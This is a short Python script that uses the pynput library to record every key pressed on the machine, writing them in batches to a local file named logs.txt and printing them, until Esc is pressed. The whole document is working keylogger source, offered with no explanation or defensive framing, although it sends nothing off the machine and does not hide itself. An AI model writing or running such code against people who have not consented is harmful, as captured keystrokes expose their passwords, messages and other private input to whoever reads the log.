import pynput
from pynput.keyboard import Key , Listener
keys=[]
count=0
open("logs.txt",'w')
def on_press(key):
    global keys , count
    keys.append(key)
    count+=1
    if count >10:
        count=0
        write_file(keys)
        keys=[]
    

def write_file(keys):
     
     with open("logs.txt",'a') as f:
         f.write('\n')
         
         for key in keys:
             key=str(key)
             try :
                 
                 key=key.replace("'","")
                 print(key)
                 f.write(str(key))
             except:
                 f.write(key)
            
def on_release(key):
    if key == Key.esc :
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
